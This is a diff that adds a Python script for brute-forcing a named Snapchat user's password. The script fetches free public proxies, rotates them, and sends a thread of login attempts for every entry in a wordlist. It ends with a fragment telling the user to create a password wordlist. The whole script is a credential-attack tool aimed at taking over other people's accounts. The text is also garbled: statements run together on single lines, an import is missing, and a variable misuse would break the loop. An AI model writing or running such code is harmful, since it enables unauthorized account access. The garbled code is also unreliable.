@@ -1,0 +1,42 @@
+import json
+import threading
+from termcolor import colored
+from bs4 import BeautifulSoup
+
+# Load proxies from Geonode API
+proxies = json.loads(requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc').text)
+
+def test_proxy(proxy):
+    try:
+        response = requests.get('https://www.google.com', proxies={'http': f'http://{proxy["ip"]}:{proxy["port"]}'}, timeout=5)        if response.status_code == 200:
+            return True
+    except:
+        pass
+    return False
+
+def snapchat_brute(username, password): session = requests.Session() login_url = 'https://accounts.snapchat.com/login'
+    payload = {
+        'username': username,
+        'password': password}
+
+    # Use a valid proxy for each attempt
+    for proxy in proxies:
+        if test_proxy(proxy):
+            proxies = {'http': f'http://{proxy["ip"]}:{proxy["port"]}'}
+            response = session.post(login_url, data=payload, proxies=proxies) if 'snapchat.com/login/password-reset' in response.text:
+                print(f'[+] Password found: {password}') break
+            elif 'snapchat.com/login' in response.text:                print(f'[-] Invalid password: {password}')            else:
+                print(f'[?] Unknown response for password: {password}')
+
+if __name__ == '__main__':    username = input('Enter the Snapchat username: ')    wordlist = input('Enter the path to the wordlist: ')
+
+    with open(wordlist, 'r') as file:
+        words = file.readlines() threads = []    for word in words:
+        password = word.strip()        t = threading.Thread(target=snapchat_brute, args=(username, password))
+        threads.append(t)        t.start()
+
+    for t in threads:
+        t.join()
+```Now, create a wordlist (words.txt) containing Snapchat passwords to brute force:
+
+```bashecho"password123" > words.txt
